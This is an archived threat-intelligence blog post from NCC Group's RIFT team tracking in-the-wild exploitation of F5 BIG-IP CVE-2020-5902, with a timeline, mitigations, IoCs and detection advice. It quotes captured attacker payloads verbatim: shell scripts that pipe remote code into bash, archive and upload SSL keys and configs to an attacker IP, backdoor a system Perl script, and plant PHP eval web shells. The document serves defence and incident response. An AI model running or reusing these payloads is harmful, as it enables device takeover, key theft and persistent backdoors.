{
    "id": "fdf74ddd-b023-4c82-8808-484345e6e688",
    "created_at": "2023-01-12T15:00:20.601926Z",
    "updated_at": "2025-03-27T02:05:26.972192Z",
    "deleted_at": null,
    "sha1_hash": "e00dc7a8049872d0e210d0e4707809493767eec7",
    "title": "2020-07-05 - RIFT- F5 Networks K52145254- TMUI RCE vulnerability CVE-2020-5902 Intelligence",
    "authors": "",
    "file_creation_date": "2022-05-28T18:22:15Z",
    "file_modification_date": "2022-05-28T18:22:15Z",
    "file_size": 2375321,
    "plain_text": "# RIFT: F5 Networks K52145254: TMUI RCE vulnerability CVE-2020-5902 Intelligence\n\n**[research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/](https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/)**\n\nJuly 5, 2020\n\n## tl;dr\n\n[CVE-2020-5902 was disclosed on July 1st, 2020 by F5 Networks in K52145254 as a CVSS](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902)\n10.0 remote code execution vulnerability in the Big-IP administrative interface. By July 3rd,\n2020 NCC Group observed active exploitation. This blog is a summary of what we know as\nthe situation develops.\n\n_About the Research and Intelligence Fusion Team (RIFT):_\n\nRIFT leverages our strategic analysis, data science, and threat hunting capabilities to create\nactionable threat intelligence, ranging from IoCs and detection capabilities to strategic\nreports on tomorrow’s threat landscape. Cyber security is an arms race where both attackers\nand defenders continually update and improve their tools and ways of working. To ensure\nthat our managed services remain effective against the latest threats, NCC Group operates a\nGlobal Fusion Center with Fox-IT at its core. This multidisciplinary team converts our leading\ncyber threat intelligence into powerful detection strategies.\n\n## The Vulnerability / Patch\n\n\n-----\n\nOur advice is if you patched after 4th July you need to assume compromise and conduct an\nforensic examination of the server. If you applied any of the mitigations, it is also likely, and\nyou should check for signs of exploitation soon before logs are rotated.\n\n[The vulnerability was discovered by Positive Technologies and an associated blog post](https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/)\n[released on July 2nd, 2020. NCC Group’s RIFT established a live post on Reddit on July 3rd](https://www.reddit.com/r/blueteamsec/comments/hkjxob/live_post_cve20205902_f5_bigip_the_traffic/)\nto collate early intelligence and raise awareness within the cyber defence and sysadmin\ncommunities.\n\n[In the F5 knowledge base article K52145254 there is the following mitigation:](https://support.f5.com/csp/article/K52145254)\n```\n<LocationMatch \".*\\.\\.;.*\">\nRedirect 404 /\n</LocationMatch>\n\n```\nThis regex checks for:\n```\n..;\n\n```\nAs such it can be described as a directory traversal vulnerability. This ability combined with\nfunctionality native to the device provides the ability to access files, upload files and execute\ncode without authentication.\n\n## Timeline of Events\n\nClick for full size\n\n## Reporting Vulnerable Hosts to Providers\n\n\n-----\n\nWe had someone report to our hosting provider one of our vulnerable hosts.\n\n## REST Exploitation\n\nWe observed a novel code execution mechanism. The risk is that anyone who has gained a\npassword via:\n\nBackdoor account addition via original RCE vectors (tmsh, hsqldb)\nDumped/cracked passwords (via RCE or `tmsh list`)\nPassword spraying for known backdoor accounts\n\nCan still execute code using the REST API\n\n## More Complex Payloads and Miners\n\nAs of July 14th, 2020 we are seeing an actor deploy the following.\n\n\n-----\n\n```\n// firmwareupdate.php \ncurl http://148.251.87.169/metrics.php | bash > /tmp/f5_reconfig.txt;\ntar -czvf /tmp/ssl.tar.gz /config/ssl/;\ntar -czvf /tmp/f5_metadata.tar.gz /tmp/f5_reconfig.txt /tmp/ssl.tar.gz;\nrm /tmp/ssl.tar.gz /tmp/f5_reconfig.txt;\nopenssl enc -in /tmp/f5_metadata.tar.gz -out /tmp/enc.dat -e -aes256 -k\n5up3r53cr37p455w0rd;\ncurl -F \"dnscache=@/tmp/enc.dat\" http://148.251.87.169/dnscacheresolve.php;\nrm /tmp/f5_metadata.tar.gz /tmp/enc.dat\n// metrics.php \n#!/bin/bash\ncommands=( 'which getenforce > /dev/null && getenforce || echo Disabled'\n      'find /config -name \"*.conf\" | xargs tar P -T /dev/null --dereference -zc\n--ignore-failed-read | base64'\n      'find / -maxdepth 1 -type f -name \"VERSION*\" | xargs tar P -T /dev/null -dereference -zc --ignore-failed-read | base64'\n      'if find /etc -maxdepth 1 -name \"rsyslog*\" -type d > /dev/null\n2>/dev/null; then grep -Rq \"^[^#]*@@\" /etc/rsyslog*; echo $?; else echo \"1\"; fi'\n      'if find /etc -maxdepth 1 -name \"syslog-ng*\" -type d >/dev/null\n2>/dev/null; then grep -Rv \"^\\\\s*#\" /etc/syslog-ng* | grep -q \"destination remote\";\necho $?; else echo \"1\"; fi'\n      \"grep -oE 'cache-path ([^\\S]+)' /config/bigip.conf | awk '{ print $2 }' |\nxargs tar P -T /dev/null --dereference -zc --ignore-failed-read | base64\"\n      'ifconfig'\n      \"cat /proc/uptime | awk '{ print $1 }'\"\n      'find /usr/lib* /lib* -type f -name \"*.so*\" -exec md5sum {} \\;'\n      'tar P -T /dev/null --dereference -zc --ignore-failed-read /var/log/audit\n| base64'\n      'tar P -T /dev/null --dereference -zc --ignore-failed-read /root/.tmshhistory-root | base64'\n      'cat /proc/meminfo'\n      'cat /proc/cpuinfo'\n      'df -haP'\n      'tar P -T /dev/null --dereference -zc --ignore-failed-read\n/config/bigip.license | base64'\n      'ls -l /config/bigpipe/config_base.conf'\n)\nfor command in \"${commands[@]}\"; do\n  echo \"___\"\n  echo \"___\" >&2\n  echo $command | bash\n  echo \"~~~\"\n  echo $?\ndone\n\n```\nWe have also seen the actor checking, we suspect to try and detect honeypots\n```\nthey are checking /etc/rsyslog*\n\n```\nWe also saw a couple of days ago our first xmr miners, these have continued to be deployed\n```\nSHA1: 79f80e6528e6bf552f55f8efe9d8d291ec0a2e78\n\n```\n\n-----\n\n## Deployments Continue\n\nAs of July 12, 2020 at 20:00 we’re observing various actor activity including\n```\nJul 12 20:52:39 \n\"sha1\": \"eebc1efe99bb5040498365322105cc5bd4dc59a5\", \n\"full_path\": \"/tmp/sh-thd-1594586507\", \n\"contents\": \n'getrektdotcom\\\\nmount -o remount,rw /usr &&sed \\\\'/renice/ a system(\\\"nohup curl\nhttps://pastebin.com/raw/jDu3vDgM | bash & disown\\\"); # upload metrics\\\\' -i -/usr/bin/diskmonitor && sed \\\\'/AlertThres/ a system(\\\"nohup curl -L\nf5update.ddns.net/update.html | bash & disown\\\"); # check for updates\\\\' -i -/usr/bin/diskmonitor && mount -o remount,ro /usr\\\\ncurl\n\\\"http://f5updates.eu5.org/updates/update.sh\\\" | bash\\\\nchmod 644\n/var/run/config/resolv.conf\\\\necho \\\"nameserver 1.1.1.1\\\" >>\n/var/run/config/resolv.conf\\\\nchmod 444 /var/run/config/resolv.conf\\\\nrm\n/tmp/8RGJUXMSDC\\\\n'\n\n```\nand\n\n\n-----\n\n```\nJul 12 20:53:07 \n\"sha1\": \"784fb1aea7d9693e7df4ba70fb8abc7138701ccf\", \n\"full_path\": \"/usr/bin/sedP6OVFl\", \n\"contents\": \"\n#!/usr/bin/perl\\\\n#\\\\n\n#    Monitor disk usage\\\\n\n#    - Log warning and error conditions\\\\n\n#    - Launch log rotate to reduce space\\\\n\n#    - Persist info for predictive warnings\\\\n\n#\\\\n\n\\\\n\nuse strict;\\\\n\nuse F5::COAPI;\\\\n\nuse Scalar::Util qw( reftype );\\\\n\n\\\\n\nuse constant {\n\\\\n  \nMCP_PHASE_NONE => 0,\\\\n\n};\\\\n\n\\\\n\nour $LOG_WALL; \n# call_log will also write on wall if true (localizable)\\\\n\nsystem(\\\"nohup curl https://pastebin.com/raw/wbPw3E65 | bash & disown\\\"); # check for\nupdates\\\\n\n\\\\n\n# fwd decl / proto\\\\n\nsub isMcpdListening();\\\\n\nsub getDbVars();\\\\n\n\\\\n\n#\\\\n\n# globals\\\\n\n#\\\\n\nmy $enable   = \\\"disable\\\";\\\\n\nmy $interval  = 10;\\\\n\nmy $timelast  = 0;\\\\n\nmy $mcpd    = 0;\\\\n\nmy $now     = time();\\\\n\nmy $nodb    = 1;  # find any DB vars?\\\\n\nmy $minfree   = 100; # min free space in any partition\\\\n\nmy $object   = undef;\\\\n\n#\\\\n\n# arrays indexed by partition\\\\n\n#\\\\n\nmy %monitor   = {};  # action: check changes, limits, growth, none\\\\n\nmy %warn    = {};  # percent level to warn if above\\\\n\nmy %alert    = {};  # percent level to alert if above\\\\n\nmy %growth   = {};  # perce\n\n## Another Mitigation Bypass and IoC\n\n```\nAs of 15:23 on July 11, 2020 we’ve observed another attempted mitigation bypass variant\n\n\n-----\n\nThe actor us used to use a netcat back to 217.12.199[.]179\n\n[By pass used in this instance was disclosed publicly on July 10th, 2020 on Twitter.](https://twitter.com/jas502n/status/1281631563017367552)\n\n## Mitigation Bypass and IoCs\n\n[As of 18:24 on July 7, 2020 it has been publicly reported that the mitigation can be](https://twitter.com/TeamAresSec/status/1280553293320781825)\nbypassed.\n\nOur data shows this bypass was first publicly exploited at 12:39 on July 7, 2020 (6 hours\nbefore).\n\n\n-----\n\nthe response to the above was a revised mitigation of\n```\n<LocationMatch \";\">\nRedirect 404 /\n</LocationMatch>\n\n```\nEarly data made available to us, as of 08:05 on July 8, 2020, is showing of ~10,000 Internet\nexposed F5 devices that ~6,000 were made potentially vulnerable again due to the bypass.\n\nWe’ve released bypass IoCs at:\n\nhttps://github.com/nccgroup/Cyber-Defence/blob/master/Intelligence/CVE-20205902/bypass-iocs.md\n\nAs of 17:09 on July 9th, 200 we’ve observed a second actor using a bypass.\n\nThe actors inbound attack and their reverse shell went to the class B 195.123.\n\n## Further Mitigation Bypasses\n\nAs of 19:40 on July 8, 2020 F5 have stated all previous mitigation where not fully effective\n\n\n-----\n\nOur advice remains to UPGRADE not mitigate and IP filter TMUI interfaces.\n\n## Exploitation\n\nThe graph below shows the exploitation seen on NCC Group’s honeypot during the morning\nof July 5th, 2020.\n\nClick for full size\nThe graph below shows the exploitation seen on NCC Group’s honeypot during the morning\nof July 6th, 2020\n\n\n-----\n\nClick for full size\nExploitation is varied including the access of password hashes:\n\nAs of Saturday remote code execution capabilities existed.\n\nThe first IPs we observed actively exploiting the issue were published at 17:00 UTC on July\n4th, 2020 – https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-20205902\n\nIn addition to these initial exploit attempts quickly there after details were shared in open\nsource.\n\n[15:53 July 5th, 2020 fully functional exploit payloads were shared on Twitter](https://twitter.com/x4ce/status/1279790599793545216)\n\n\n-----\n\n17:00 July 5th, 2020 reverse engineering analysis and example payloads were\n[released on Github.](https://github.com/jas502n/CVE-2020-5902)\n[21:29 July 5th, 2020 Metasploit exploit modules were made available.](https://github.com/rapid7/metasploit-framework/pull/13807)\n[02:26 July 6th, 2020 Further exploits released on Github.](https://github.com/yasserjanah/CVE-2020-5902)\n09:34 July 6th, 2020 Metasploit exploitation seen in the wild\n10:18 July 6th, 2020 New second stages observed\n\n## Staged Exploitation\n\nWe have as of 10:00 on July 6th, 2020 started to see staged exploitation, namely a payload\nof:\n\nThe full payload is\n\n\n-----\n\nClick for full\n\nsize\nWe have as of 10:29 on July 6th, 2020 started to see a second staged exploitation, namely:\n\nClick for full size\n\nWith a payload of\n\n\n-----\n\n_Click_\n\n_for full size_\nIoCs for the 2nd stage are\n```\nb8ce500c1e6ec4d4268ae0d2de82f9f35bbfc673 /tmp/demo.txt\n\n```\nWe have as of 16:17 on July 6th, 2020 started to see a third staged exploitation, namely:\n\n\n-----\n\n```\ne1775079d58a6266fdd6185143642ac53b4314fe /var/log/F5-logcheck/zabbix\n\n```\nanother IoC for this actor is\n```\n/tmp/cepi\n\n```\nOf note this actor did their original scans on July 6th, 2020 at 10:30 and the returned ~6\nhours later.\n\n## Webshells\n\nAs of 16:51 on July 6th, 2020 we’ve seen our first web shell\n```\nmount -o remount -rw /usr ; echo\nPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2NpdHJpeEBraGFycGVkYXInXSkpOz8+ |\n/usr/bin/openssl base64 -d -out /usr/local/www/xui/common/images/bg_status.php\n\n```\nwhen decoded appears to be a reused web shell from Citrix\n```\n<?php @eval(base64_decode($_POST['citrix@kharpedar']));?>\n\n```\nAs of 09:26 on July 7th, 2020 we’ve seen a second web shell\n```\nmount -o remount -rw /usr ;echo 'utility<?php\n@eval(base64_decode($_POST[\"session_sK4hodQm\"]));' >\n/usr/local/www/xui/common/scripts/utility.php;mount -o remount -r /usr\n\n```\nAs of 10:10 on July 8th, 2020 we’ve seen a third web shell\n```\nmount -o remount -rw /usr ;echo 'utility<?php\n@eval(base64_decode($_POST[\"session_4yps1tV2\"]));' >\n/usr/local/www/xui/common/scripts.php;mount -o remount -r /usr\n\n```\nAs of 10:15 on July 8th, 2020 we’ve seen our first JSP web shell\n\n\n-----\n\n## New Exploit from Release to Use in < 12 Hours\n\n[As of 12:30 on July 7th, 2020 we’ve seen use of a new exploit](https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/)\n\nWhilst not shown above it was combined with this detection bypass attempt not discussed in\nthe blog.\n\n\n-----\n\nWe can see them trying to set a password of ABcD007\n\n## Actors Enabling Features\n\nWe’ve observed during the morning of July 8th, 2020 actors doing a multi-staged attack with\nthe following the first payload\n```\njava.lang.System.setProperty\"\n('org.apache.commons.collections.enableUnsafeSerialization','true')\n\n## Impact\n\n```\nAs the devices are load balancers they provide the opportunity to:\n\nAcquire credentials\nAcquire access to existing sessions through cookie theft\nAcquire license keys\nPerform traffic interception and modification\nPivot into the internal network\nAcquire the private keys to any SSL/TLS certificates on the device\n\n## SIEM Log Configuration\n\n[F5 provide documentation on how to configure SYSLOG integration, which we strongly](https://www.pwndefend.com/2020/07/07/configuring-syslog-integration-with-f5-big-ip/)\nrecommend.\n\n## Incident Analysis\n\n\n-----\n\nThere are forensics artifacts available, although the log they are stored is limited to 20MB\nand thus risks cycling quickly.\n\nClick for details\nThe wider HTTP log configuration differs from a default configuration.\n```\n#\n# The location and format of the access logfile (Common Logfile Format).\n# If you do not define any access logfiles within a <VirtualHost>\n# container, they will be logged here. Contrariwise, if you *do*\n# define per-<VirtualHost> access logfiles, transactions will be\n# logged therein and *not* in this file.   \n#   \n#CustomLog \"logs/access_log\" common   \n#  \n# If you prefer a logfile with access, agent, and referer information\n# (Combined Logfile Format) you can use the following directive.   \n#   \nCustomLog \"/var/run/httpd.pipe\" acc_combined\n\n```\nThe configuration causes it to send its output to a pipe. This pipe ultimately goes to\nsystemd/journalctl\n```\n# grep httpd /etc/syslog-ng/syslog-ng_sysinit.conf.default \nsource s_httpd {\n  pipe(\"/var/run/httpd.pipe\" optional(yes) perm(0660) group(\"apache\"));\ndestination d_httpd_err {\n  file(\"/var/log/httpd/httpd_errors\" create_dirs(yes));\n  source(s_httpd);\n  destination(d_httpd_err);\n\n```\nOther forensic artifacts made include new .jsp files or similar used to achieve code\nexecution.\n\n## Exploitation Detection\n\n[A Sigma rule has been created and available here. However in order to utilize it will require](https://github.com/Neo23x0/sigma/blob/master/rules/web/web_cve_2020_5902_f5_bigip.yml)\nfor the logs of the Big-IP to be sent to a SIEM as passive network detection won’t work\nunless SSL/TLS can be decrypted.\n\n## Incident Support\n\nBelieve your organisation may have been compromised? Contact us on cirt@nccgroup.com\n\n\n-----\n\n## Change Log\n\nJuly 20th, 2020 @ 17:22 – v1.29 – added REST exploitation mechanism\nJuly 14th, 2020 @ 12:37 – v1.28 – further activity including more complex activity\nJuly 13th, 2020 @ 09:54 – v1.27 – further activity\nJuly 12th, 2020 @ 11:19 – v1.26 – linked to public disclosure of bypass used yesterday\nJuly 11th, 2020 @ 16:14 – v1.25 – variant of bypass observed\nJuly 9th, 2020 @ 18:45 – v1.24 – second actor using bypass\nJuly 8th, 2020 @ 19:40 – v1.23 – further mitigation bypasses added\nJuly 8th, 2020 @ 11:29 – v1.22 – added bypass IoCs\nJuly 8th, 2020 @ 11:13 – v1.21 – added web shells and 1st stage\nJuly 8th, 2020 @ 08:08 – v1.20 – updated advice\nJuly 8th, 2020 @ 08:06 – v1.19 – added bypass impact quantification i.e. those that became\nvulnerable\nJuly 8th, 2020 @ 07:12 – v1.18 – added revised mitigation for completeness\nJuly 7th, 2020 @ 20:56 – v1.17 – added mitigation bypass update\nJuly 7th, 2020 @ 20:53 – v1.16 – added SYSLOG integration\nJuly 7th, 2020 @ 13:15 – v1.15 – added new exploit\nJuly 7th, 2020 @ 09:26 – v1.14 – added the second web shell\nJuly 6th, 2020 @ 17:09 – v1.13 – added the first web shell\nJuly 6th, 2020 @ 16:40 – v1.12 – added another staged payload\nJuly 6th, 2020 @ 13:13 – v1.11 – added detection aspects and session cookie theft\nJuly 6th, 2020 @ 10:21 – v1.10 – added staged payload\nJuly 6th, 2020 @ 09:48 – v1.9 – added Honeypot attack volumes from this morning\nJuly 6th, 2020 @ 09:34 – v1.8 – added fact Metasploit exploitation seen in the wild\nJuly 6th, 2020 @ 09:00 – v1.7 – added timeline of events\nJuly 6th, 2020 @ 05:46 – v1.6 – added Metasploit modules and other public exploits\nreleased overnight\nJuly 5th, 2020 @ 21:22 – v1.5 – added license key theft based on honeypot data\nJuly 5th, 2020 @ 17:34 – v1.4 – included link to fully functional exploit being shared\nJuly 5th, 2020 @ 16:28 – v1.3 – Further clarification on log pipe consumption\nJuly 5th, 2020 @ 16:23 – v1.2 – New journalctl output example\nJuly 5th, 2020 @ 16:16 – v1.1 – Clarified log pipe usage\nJuly 5th, 2020 @ 15:40 – v1.0 – Initial version\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-05 - RIFT- F5 Networks K52145254- TMUI RCE vulnerability CVE-2020-5902 Intelligence.pdf"
    ],
    "report_names": [
        "2020-07-05 - RIFT- F5 Networks K52145254- TMUI RCE vulnerability CVE-2020-5902 Intelligence.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535620,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1653762135,
    "ts_modification_date": 1653762135,
    "files": {
        "pdf": "https://archive.orkl.eu/e00dc7a8049872d0e210d0e4707809493767eec7.pdf",
        "text": "https://archive.orkl.eu/e00dc7a8049872d0e210d0e4707809493767eec7.txt",
        "img": "https://archive.orkl.eu/e00dc7a8049872d0e210d0e4707809493767eec7.jpg"
    }
}